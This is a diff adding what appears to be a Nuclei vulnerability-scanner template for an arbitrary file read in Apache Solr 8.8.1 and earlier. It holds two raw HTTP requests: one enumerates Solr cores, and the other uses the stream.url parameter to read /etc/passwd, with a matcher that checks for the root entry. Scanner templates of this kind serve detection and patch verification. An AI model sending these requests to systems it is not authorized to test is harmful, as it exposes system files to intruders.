@@ -1,0 +1,46 @@
+id: apache-solr-file-read
+info:
+  author: DhiyaneshDk
+  name: Apache Solr <= 8.8.1 Arbitrary File Read
+  reference:
+  - https://twitter.com/Al1ex4/status/1382981479727128580
+  - https://nsfocusglobal.com/apache-solr-arbitrary-file-read-and-ssrf-vulnerability-threat-alert/
+  - https://twitter.com/sec715/status/1373472323538362371
+  severity: high
+  tags: apache,solr,lfi
+requests:
+- extractors:
+  - group: 1
+    internal: true
+    name: core
+    regex:
+    - '"name"\:"(.*?)"'
+    type: regex
+  matchers:
+  - status:
+    - 200
+    type: status
+  - regex:
+    - 'root:.*:0:0:'
+    type: regex
+  matchers-condition: and
+  raw:
+  - 'GET /solr/admin/cores?wt=json HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Language: en
+
+    Connection: close
+
+    '
+  - 'GET /solr/{{core}}/debug/dump?stream.url=file:///etc/passwd&param=ContentStream
+    HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Language: en
+
+    Connection: close
+
+    '
